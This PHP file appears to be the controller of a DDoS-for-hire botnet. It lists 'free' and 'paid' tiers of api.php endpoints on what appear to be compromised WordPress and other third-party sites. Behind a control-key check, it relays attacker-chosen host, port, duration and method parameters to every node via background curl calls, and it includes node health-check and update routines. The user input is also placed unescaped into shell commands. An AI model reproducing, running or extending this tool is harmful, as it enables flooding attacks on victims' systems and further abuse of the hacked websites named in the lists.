<?php
ignore_user_abort(true);
set_time_limit(0);
error_reporting(-1);

$free = array(
    "https://turnuva.playerones.com/wp-content/api.php",
    "https://herbovet.net/wp-content/plugins/vusjnauvpx/api.php",
    "https://media.ind.in/wp-content/api.php",
    "https://hisab.tspltest.com/api.php",
    "http://cptatavasco.com.mx/wp-backup/api.php"
);

$paid = array(
    // "https://apascoffee.com/wp-content/plugins/voqcwzpupp/api.php",
    // "https://co-branding.co.nz/wp-content/plugins/vdpqlwveqc/api.php",
    // "http://guvenveroline.com/wp-content/plugins/vugkgazcpj/api.php",
    // "https://touchofthetropics.co.nz/wp-content/plugins/pnrjbnwzyj/api.php",
    // "https://brockinteriorsltd.com/test/wp-content/plugins/pqcpcyldhr/api.php",
    // "https://www.cerebellumcounselling.com/wp-content/plugins/tsftuvbvmu/api.php",
    // "https://dealsnewshubb.com/wp-content/plugins/nwysljykux/api.php",
    // "https://khayal.events/api.php",
    // "https://nodus.org.mx/api.php",
    "https://services365.ca/wp-content/plugins/wvfhjwxtei/api.php",
    "http://aleenahozbeauty.com/api.php",
    "https://startickets.f1support.net/api.php",
    "https://coolpexgulf.com/api.php",
    "https://icajobspune.nexuspublishing.in/wp-content/api.php",
    "http://melbournecarpetrepairs.rajarshisolutions.net/api.php",
    "https://srv05.jvexecutive.com/~tampico7011/logs/api.php",
    "https://pawereg.com/wp-content/api.php",
    "https://solid.tisti.ru/api.php",
);

$digital = array();

$full = array_merge($paid, $free, $digital);


$key = $_GET['key'];
$ckey = $_GET['ckey'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$list = $_GET['list'];
$debug = isset($_GET['debug']) ? 1 : 0;

$lists = array("free", "paid", "digital", "full");
$ray = array("7ed408c442ecdf2a8e16398a6f05355c");

if (!empty($key)) {
} else {
    die('Error: API key is empty!');
}

if (!empty($ckey)) {
} else {
    die('Error: Control key is empty!');
}

if (in_array(md5($ckey), $ray)) {
} else {
    die('Error: Incorrect Control key!');
}

if (!empty($list)) {
} else {
    die('Error: List is empty!');
}

if (in_array($list, $lists)) {
} else {
    die('Error: Incorrect list!');
}

if (!empty($time)) {
} else {
    die('Error: time is empty!');
}


if (!empty($host)) {
} else {
    die('Error: Host is empty!');
}

if (!empty($port)) {
} else {
    die('Error: Port is empty!');
}


if (!empty($method)) {
} else {
    die('Error: Method is empty!');
}


if ($port > 44405) {
    die('Error: Ports over 44405 do not exist');
}

$servers = array();

switch ($list) {
    case "free":
        $servers = $free;
        break;
    case "paid":
        $servers = $paid;
        break;
    case "digital":
        $servers = $digital;
        break;
    case "full":
        $servers = $full;
        break;
}

function execInBackground($cmd)
{
    global $debug;
    if ($debug)
        echo ("Executing $cmd<br>");
    if (substr(php_uname(), 0, 7) == "Windows") {
        pclose(popen("start /B " . $cmd, "r"));
    } else {
        exec($cmd . " > /dev/null &");
    }
}

if ($method == "check") {
    $w = 0;
    foreach ($servers as $i => $url) {
        $cmd = "curl -X GET \"$url\"";
        $a = shell_exec($cmd);
        if (strpos($a, "Error: API key is empty!") !== false) {
            $w++;
            echo "<a style='color:green'>$url: Working</a><br>";
        } else {
            echo "<a style='color:red'>$url: Not Working</a><br>";
        }
    }
    $serlen = count($servers);
    die("Working: $w/$serlen");
}

foreach ($servers as $i => $url) {
    $params = "?host=$host&port=$port&time=$time&key=$key&method=$method";
    $to_req =  $url . $params;
    $cmd = "curl -X GET \"$to_req\"";
    if ($debug) {
        $a = shell_exec($cmd);
        echo "<a style='color:green'>$to_req</a><br>$a<br>";
    } else {
        execInBackground($cmd);
    }
}




if ($method == "update") {
    echo "Waiting 15 seconds...<br>";
    sleep(15);
    $current_version = file_get_contents('version.txt');
    foreach ($servers as $i => $url) {
        $url = str_replace("api.php", "version.txt", $url);
        $cmd = "curl -X GET \"$url\"";
        $a = shell_exec($cmd);
        if ($current_version == $a) {
            echo "<a style='color:green'>$url: $a</a><br>";
        } else {
            echo "<a style='color:red'>$url: $a</a><br>";
        }
    }
}
